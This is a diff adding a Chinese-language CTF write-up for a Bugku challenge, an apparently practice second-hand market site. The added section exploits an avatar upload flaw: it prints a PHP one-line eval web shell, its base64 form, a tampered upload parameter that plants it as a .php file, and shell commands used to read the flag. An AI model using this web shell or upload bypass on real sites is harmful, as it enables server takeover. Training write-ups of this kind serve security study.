@@ -2323,6 +2323,55 @@ array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockeren
 
 ------
 
+## Bugku
+
+### xxx二手交易市场
+
+先随便注册一个用户登录上去，然后上传头像这个功能存在文件上传漏洞。
+
+编写`PHP`一句话木马：
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+`base64`加密后得到字符串`PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==`。
+
+随便点击一张图片上传，然后修改图片信息为
+
+```
+image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
+```
+
+可以看到上传成功的响应头信息如下：
+
+```json
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Sun, 07 Apr 2024 09:31:29 GMT
+Content-Type: application/json; charset=utf-8
+Connection: close
+X-Powered-By: PHP/7.3.22
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 98
+
+{"code":1,"msg":"保存成功!","data":"\/Uploads\/heads\/8c9898401a38fdad.php","url":"","wait":3}
+```
+
+使用蚁剑连接靶机，打开虚拟终端。
+
+```bash
+$ find / -name flag*
+$ cat /var/www/html/flag
+flag{27be6f3753c7a1b12345a7a5a7d1127c}
+```
+
+提交`flag{27be6f3753c7a1b12345a7a5a7d1127c}`即可。
+
+------
+
 ## CTFSHOW
 
 ### [七夕杯web签到](https://www.ctf.show/challenges#web%E7%AD%BE%E5%88%B0-3767)
